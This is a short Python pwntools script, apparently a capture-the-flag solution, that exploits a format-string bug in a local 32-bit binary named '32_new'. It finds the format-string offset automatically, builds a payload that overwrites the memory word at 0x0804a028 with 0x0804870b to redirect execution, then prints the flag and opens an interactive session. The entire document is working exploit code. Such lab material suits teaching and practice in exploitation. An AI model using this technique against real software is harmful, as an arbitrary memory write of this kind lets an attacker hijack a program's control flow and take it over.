#!/usr/bin/env python3

from pwn import *

context.log_level = "critical"
context.binary = binary = ELF("./32_new")

p = process("./32_new")
p.recvline()
# gdb.attach(p, gdbscript="break *0x080487e8\ndefine hook-stop\nx/x 0x0804a028\nend")

# p.recvline()

def send_payload(payload):
	# log.info("payload = %s" % repr(payload))
	p = process("./32_new")
	p.recvline()
	p.sendline(payload)
	return p.recvall()

auto_fmt = FmtStr(send_payload)
offset = auto_fmt.offset
#fmt_str.write(0x0804a028, 0x0804870b)
#fmt_str.execute_writes()

payload = fmtstr_payload(offset, {0x0804a028: 0x0804870b})

p.sendline(payload)

flag = p.recvall()
print("Flag: ", flag)
# log.info(f"payload is {payload}")
# p.sendline(payload)

p.interactive()
